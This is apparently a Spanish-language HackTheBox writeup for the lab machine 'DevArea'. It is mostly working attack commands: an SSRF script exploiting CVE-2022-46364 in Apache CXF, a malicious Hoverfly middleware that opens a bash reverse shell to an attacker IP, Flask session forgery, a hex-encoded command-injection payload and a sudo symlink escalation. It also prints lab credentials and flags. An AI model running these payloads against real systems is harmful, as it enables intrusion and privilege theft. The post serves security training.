---
title: "HTB DevArea — Writeup"
date: 2026-06-13 00:00:00 +0200
categories: [Writeups, HackTheBox]
tags: [ssrf, soap, mtom, xop, hoverfly, middleware-rce, flask, session-forgery, command-injection, symlink, linux, medium, cve-2022-46364]
image:
  path: /assets/img/posts/htb-devarea-banner.png
  alt: HTB DevArea
---

**Dificultad:** Media  
**OS:** Linux

**Objetivo:** Explotar SSRF en Apache CXF para leer credenciales de Hoverfly, ejecutar código via middleware Python, escalar abusando de una app Flask con session forgery y command injection, y leer root.txt mediante una cadena de symlinks.

---

## Resumen

DevArea combina cinco vectores encadenados: SSRF a través de CVE-2022-46364 (MTOM XOP Include en Apache CXF 3.2.14) para leer `/proc/PID/cmdline` y extraer credenciales de Hoverfly, middleware RCE en Hoverfly como `dev_ryan`, forja de sesión Flask en una app interna (`syswatch`) usando `flask-unsign`, inyección de comandos en el endpoint de estado de servicios (regex permisiva + `shell=True`), y finalmente una cadena de symlinks para leer `/root/root.txt` con el script `syswatch.sh` que corre como root.

---

## Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 -oN devarea_full.nmap 10.129.244.208
```

Puertos relevantes:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd — login anónimo habilitado |
| 80/tcp | HTTP | Apache — sitio estático |
| 8080/tcp | HTTP | Apache CXF 3.2.14 — SOAP endpoint |
| 8500/tcp | HTTP | Hoverfly proxy |
| 8888/tcp | HTTP | Hoverfly admin API |

### FTP anónimo

```bash
ftp 10.129.244.208
# User: anonymous / Pass: <vacío>
ls
# employee-service.jar
get employee-service.jar
```

Descompilando el JAR (jadx / Procyon) se confirma Apache CXF 3.2.14 con **Aegis DataBinding** — combinación vulnerable a CVE-2022-46364.

---

## Fase 1: SSRF via CVE-2022-46364 (MTOM XOP Include)

Apache CXF con Aegis DataBinding procesa mensajes MTOM multipart y resuelve `xop:Include href=` sin restricciones, devolviendo el contenido del recurso codificado en base64 en la respuesta SOAP.

### Script helper

```bash
#!/bin/bash
# xop_ssrf.sh <URL>
TARGET="http://10.129.244.208:8080/employeeservice"
FETCH="$1"

curl -s -X POST "$TARGET" \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="B"; start="<root>"; start-info="text/xml"' \
  --data-binary "--B
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-ID: <root>

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns2:getEmployee xmlns:ns2="http://service.example.com/">
      <arg0><id><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="$FETCH"/></id></arg0>
    </ns2:getEmployee>
  </soap:Body>
</soap:Envelope>
--B--" | grep -oP '(?<=<return>)[^<]+' | base64 -d 2>/dev/null
```

### Obtener credenciales de Hoverfly

```bash
# Buscar el PID de Hoverfly
bash xop_ssrf.sh "file:///proc/1424/cmdline" | tr '\0' ' '
# hoverfly -db boltdb -ap 8888 -pp 8500 -username admin -password O7IJ27MyyXiU
```

Credenciales: **`admin:O7IJ27MyyXiU`**

---

## Fase 2: Hoverfly middleware RCE → shell como `dev_ryan`

Hoverfly permite definir un middleware Python que intercepta cada petición que pasa por el proxy (puerto 8500). El script se ejecuta en el servidor como `dev_ryan`.

### Obtener JWT

```bash
TOKEN=$(curl -s -X POST http://10.129.244.208:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

### Subir middleware malicioso

```python
# middleware.py — se ejecuta como dev_ryan por cada petición al proxy
import sys, json, os

data = sys.stdin.read()
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'")
print(data)
```

```bash
# Encodear y subir
B64=$(base64 -w0 middleware.py)
curl -s -X PUT http://10.129.244.208:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "{"binary":"python3","scriptBase64":"$B64"}"

# Activar modo modify
curl -s -X PUT http://10.129.244.208:8888/api/v2/hoverfly/mode \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"mode":"modify"}'

# Escuchar y disparar
nc -lvnp 4444 &
curl -s -x http://10.129.244.208:8500 http://example.com
```

Shell obtenida como `dev_ryan`. Flag de usuario:

```bash
cat ~/user.txt
# 11899580f8e859e4aab4d4d7e32b32b5
```

---

## Fase 3: Escalada a `syswatch` — Flask session forgery + command injection

### Descubrimiento

```bash
ss -tlnp | grep 7777
# syswatch Flask app en localhost:7777

cat /etc/syswatch.env
# SYSWATCH_SECRET_KEY=<clave>
```

### Forjar sesión Flask

```bash
pip3 install flask-unsign -q

flask-unsign --sign \
  --secret '<SYSWATCH_SECRET_KEY>' \
  --cookie '{"user_id": 1, "username": "admin", "_fresh": true}'
```

### Command injection en `/service-status`

El endpoint pasa el nombre de servicio a `subprocess` con `shell=True`. La regex de validación permite `$()`:

```bash
# Crear symlink /opt/syswatch/logs/root.txt → /root/root.txt
INNER='import os;os.symlink("/root/root.txt","/opt/syswatch/logs/root.txt")'
HEX=$(python3 -c "print('$INNER'.encode().hex())")
INJECT="\$(python3 -c "exec(bytes.fromhex('$HEX'))")"

curl -s -b "session=<SESSION_FORJADA>" \
  -X POST http://127.0.0.1:7777/service-status \
  --data-urlencode "service=$INJECT"
```

---

## Fase 4: Root — cadena de symlinks con `syswatch.sh`

El script `/opt/syswatch/syswatch.sh` puede ejecutarse como root via sudo y sigue symlinks sin validar el destino real:

```bash
sudo -l
# (root) NOPASSWD: /opt/syswatch/syswatch.sh logs *

# Cadena: evil.log → root.txt → /root/root.txt
ln -s /opt/syswatch/logs/root.txt /opt/syswatch/logs/evil.log

sudo /opt/syswatch/syswatch.sh logs evil.log
cat /opt/syswatch/logs/root.txt
# 584d7fc796a2c7df862a1a61e7d5d5fd
```

---

## Por qué funciona

| Pieza | Por qué es explotable |
|-------|----------------------|
| CVE-2022-46364 | CXF + Aegis DataBinding resuelve `xop:Include` sin filtrar esquemas ni destinos |
| Hoverfly middleware | Modo `modify` ejecuta Python arbitrario en el servidor por cada petición al proxy |
| Flask secret en `/etc/syswatch.env` | Legible por `dev_ryan`; con la clave se puede forjar cualquier sesión |
| `shell=True` + regex permisiva | Permite `$()` en el nombre de servicio → ejecución de comandos como `syswatch` |
| `syswatch.sh` + sudo | Sigue symlinks como root sin validar el destino final |

---

## Referencias

- [CVE-2022-46364](https://nvd.nist.gov/vuln/detail/CVE-2022-46364) — Apache CXF SSRF via MTOM XOP
- [Hoverfly middleware](https://docs.hoverfly.io/en/latest/pages/tutorials/basic/middlewarebasics/middlewarebasics.html)
- [flask-unsign](https://github.com/Paradoxis/Flask-Unsign)
- [MTOM/XOP specification](https://www.w3.org/TR/xop10/)
